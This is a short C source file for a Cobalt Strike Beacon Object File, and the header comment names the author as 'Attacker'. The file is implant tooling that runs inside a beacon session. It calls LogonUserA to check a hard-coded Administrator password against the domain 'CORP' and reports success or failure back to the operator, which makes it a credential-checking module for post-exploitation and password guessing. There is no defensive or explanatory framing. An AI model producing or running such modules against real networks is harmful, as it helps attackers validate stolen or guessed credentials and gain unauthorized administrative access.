//
// Created by Attacker on 10/21/2024.
//
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT  BOOL  WINAPI ADVAPI32$LogonUserA   (LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
DECLSPEC_IMPORT  DWORD WINAPI KERNEL32$GetLastError (VOID);
DECLSPEC_IMPORT  BOOL  WINAPI KERNEL32$CloseHandle  (HANDLE hObject);

void go(char * buf, int len) {
    HANDLE hToken;
    if (ADVAPI32$LogonUserA("Administrator", "CORP", "password1234!", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Success!");
        KERNEL32$CloseHandle(hToken);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
    }
}